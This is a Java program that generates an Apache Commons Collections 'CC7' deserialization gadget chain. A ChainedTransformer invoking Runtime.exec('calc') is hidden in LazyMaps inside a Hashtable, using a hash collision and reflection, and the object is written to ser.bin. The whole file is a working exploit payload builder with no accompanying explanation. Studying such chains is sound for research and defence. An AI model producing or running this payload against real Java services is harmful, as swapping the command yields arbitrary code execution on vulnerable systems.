import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class cc7 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});

        Map<Object,Object> hash1 = new HashMap<Object, Object>();
        Map<Object,Object> hash2 = new HashMap<Object, Object>();
        Map decorate1 = LazyMap.decorate(hash1,chainedTransformer);
        Map decorate2 = LazyMap.decorate(hash2,chainedTransformer);
        decorate1.put("yy",1);
        decorate2.put("zZ",1);

      
        Hashtable<Object, Object> objectObjectHashtable = new Hashtable<Object, Object>();
        objectObjectHashtable.put(decorate1,1);
        objectObjectHashtable.put(decorate2,2);
      
        Field iTransformers = chainedTransformer.getClass().getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer,transformer);
      
        decorate2.remove("yy");
      
        serialize(objectObjectHashtable);

//        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);

    }
    public static Object unserialize(String name) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(name));
        Object o1 = objectInputStream.readObject();
        return o1;
    }
}
